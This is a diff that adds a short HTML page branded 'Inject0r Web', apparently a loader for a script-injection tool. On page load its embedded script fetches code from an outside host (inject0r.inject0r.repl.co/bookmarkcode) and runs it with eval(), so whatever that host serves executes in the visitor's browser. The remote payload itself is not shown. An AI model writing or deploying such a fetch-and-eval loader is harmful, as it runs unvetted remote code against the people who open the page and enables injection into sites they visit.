@@ -1,0 +1,9 @@
+<head>
+	<title>Inject0r</title>
+</head>
+<body>
+  <iframe id='wind'></iframe>
+	<script>
+		var wind = document.getElementById('wind'); wind.document.write(`<head></head> <body> 	<center> 	<iframe id="header" 		style="height: 99%; width: 100%; position: absolute; inset: 0px; border: none;" 		srcdoc='<center> 		<style>body { 	background-color: gray; } h2 {   font-family: Verdana, Geneva, Tahoma, sans-serif; } h3 {   font-family: Verdana, Geneva, Tahoma, sans-serif; } </style> 			<h2>Inject0r Web</h2> 		</center> 		<center> 			<p2>© 2023 Injector Corp.</p2> 		</center> 	</div> 	<div id="webCont">'> 		</iframe> 	</center> 	<script> 		(function(){fetch('https://inject0r.inject0r.repl.co/bookmarkcode').then( function(response){ response.text().then(function(text){ eval(text); }).catch((error)=>{ alert("[ERROR:] Inject0r cannot load on this site :(") }); } )})(); 	</script> </body>`);
+	</script>
+</body>
